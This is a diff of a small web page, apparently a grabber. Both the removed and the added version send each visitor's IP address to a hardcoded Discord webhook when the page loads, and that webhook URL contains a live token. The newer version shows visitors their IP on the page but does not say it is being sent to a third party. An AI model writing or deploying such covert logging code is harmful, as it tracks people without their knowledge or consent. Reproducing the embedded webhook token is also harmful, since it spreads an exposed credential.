@@ -1,21 +1,51 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Send IP to Discord Webhook</title>
-    <script type="text/javascript">
-        function sendIP() {
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://discord.com/api/webhooks/1208920932110966846/jZZITj9syS7Yjnwd2bbLFMJ7YDQU90zaphFQWCfjzfzM7Z_4VjN3UlA-LIVWP4Tq295a", true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            var ip = "<?php echo $_SERVER['REMOTE_ADDR'];?>";
-            var params = {
-                content: "Visitor's IP: " + ip
-            }
-            xhr.send(JSON.stringify(params));
-        }
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
 </head>
-<body onload="sendIP()">
-    <h1>Thank you for visiting!</h1>
+<body>
+
+<h1>IP Logger</h1>
+<p>Your IP address: <span id="userIP"></span></p>
+
+<script>
+    // Function to get user's IP address
+    function getUserIP(callback) {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => callback(data.ip))
+            .catch(error => console.error('Error fetching IP address:', error));
+    }
+
+    // Function to display IP address
+    function displayIP(ip) {
+        document.getElementById('userIP').textContent = ip;
+    }
+
+    // Function to send IP to Discord webhook
+    function sendIPToDiscord(ip) {
+        const webhookURL = 'https://discord.com/api/webhooks/1208920932110966846/jZZITj9syS7Yjnwd2bbLFMJ7YDQU90zaphFQWCfjzfzM7Z_4VjN3UlA-LIVWP4Tq295a';
+        const message = `New visitor's IP: ${ip}`;
+        
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ content: message })
+        })
+        .then(response => console.log('IP sent to Discord'))
+        .catch(error => console.error('Error sending IP to Discord:', error));
+    }
+
+    // Get user's IP and display it
+    getUserIP(ip => {
+        displayIP(ip);
+        sendIPToDiscord(ip);
+    });
+</script>
+
 </body>
 </html>
